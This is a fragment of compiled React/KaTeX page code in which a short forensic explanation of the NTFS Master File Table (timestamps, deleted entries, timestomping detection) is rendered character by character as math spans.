                children: "MFT) is the heart of NTFS → it contains an entry for every file and folder on the volume. Each 1024-byte entry contains metadata including: timestamps (created, modified, accessed, MFT modified), file permissions, security descriptors, file size, and data location. From a forensic perspective, the MFT reveals: (1) file creation order (entries are allocated sequentially → lower numbers = earlier created), (2) deleted files (entries marked with flags 0x00, data may still exist in clusters until overwritten), (3) timestomping detection ("
              })]
            })
          })
        }), (0,jsx_runtime.jsxs)(_components.span, {
          className: "katex-html",
          "aria-hidden": "true",
          children: [(0,jsx_runtime.jsxs)(_components.span, {
            className: "base",
            children: [(0,jsx_runtime.jsx)(_components.span, {
              className: "strut",
              style: {
                height: "1em",
                verticalAlign: "-0.25em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.109em"
              },
              children: "M"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1389em"
              },
              children: "F"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1389em"
              },
              children: "T"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mclose",
              children: ")"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "h"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "h"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "f"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.109em"
              },
              children: "N"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1389em"
              },
              children: "T"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1389em"
              },
              children: "F"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0576em"
              },
              children: "S"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.2778em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mrel",
              children: "→"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.2778em"
              }
            })]
          }), (0,jsx_runtime.jsxs)(_components.span, {
            className: "base",
            children: [(0,jsx_runtime.jsx)(_components.span, {
              className: "strut",
              style: {
                height: "0.8889em",
                verticalAlign: "-0.1944em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "co"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ain"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "an"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "y"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "f"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "or"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "v"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "er"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "y"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "f"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "an"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "df"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "er"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "h"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "v"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "u"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "m"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord",
              children: "."
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0576em"
              },
              children: "E"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "c"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "h"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord",
              children: "1024"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.2222em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mbin",
              children: "−"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.2222em"
              }
            })]
          }), (0,jsx_runtime.jsxs)(_components.span, {
            className: "base",
            children: [(0,jsx_runtime.jsx)(_components.span, {
              className: "strut",
              style: {
                height: "0.8889em",
                verticalAlign: "-0.1944em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "b"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "y"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ee"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "y"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "co"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ain"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "m"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ain"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "c"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "u"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "in"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "g"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.2778em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mrel",
              children: ":"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.2778em"
              }
            })]
          }), (0,jsx_runtime.jsxs)(_components.span, {
            className: "base",
            children: [(0,jsx_runtime.jsx)(_components.span, {
              className: "strut",
              style: {
                height: "1em",
                verticalAlign: "-0.25em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "im"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "es"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "am"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "p"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mopen",
              children: "("
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "cr"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mpunct",
              children: ","
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.1667em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "m"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "f"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mpunct",
              children: ","
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.1667em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ccesse"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mpunct",
              children: ","
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.1667em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.109em"
              },
              children: "M"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1389em"
              },
              children: "F"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1389em"
              },
              children: "T"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "m"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "f"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mclose",
              children: ")"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mpunct",
              children: ","
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.1667em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "f"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "p"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "er"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "mi"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ss"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mpunct",
              children: ","
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.1667em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "sec"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "u"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "y"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "escr"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "pt"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "or"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mpunct",
              children: ","
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.1667em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "f"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "es"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.044em"
              },
              children: "z"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mpunct",
              children: ","
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.1667em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "an"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "dd"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "oc"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord",
              children: "."
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1389em"
              },
              children: "F"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ma"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "f"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "or"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "c"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "p"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "er"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "p"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ec"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "v"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mpunct",
              children: ","
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.1667em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "h"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.109em"
              },
              children: "M"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1389em"
              },
              children: "F"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1389em"
              },
              children: "T"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "v"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "s"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.2778em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mrel",
              children: ":"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mspace",
              style: {
                marginRight: "0.2778em"
              }
            })]
          }), (0,jsx_runtime.jsxs)(_components.span, {
            className: "base",
            children: [(0,jsx_runtime.jsx)(_components.span, {
              className: "strut",
              style: {
                height: "1em",
                verticalAlign: "-0.25em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mopen",
              children: "("
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord",
              children: "1"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mclose",
              children: ")"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "f"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "ecr"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "or"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "er"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mopen",
              children: "("
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "es"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "r"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "oc"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "a"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "t"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "d"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "se"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0359em"
              },
              children: "q"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "u"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "e"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
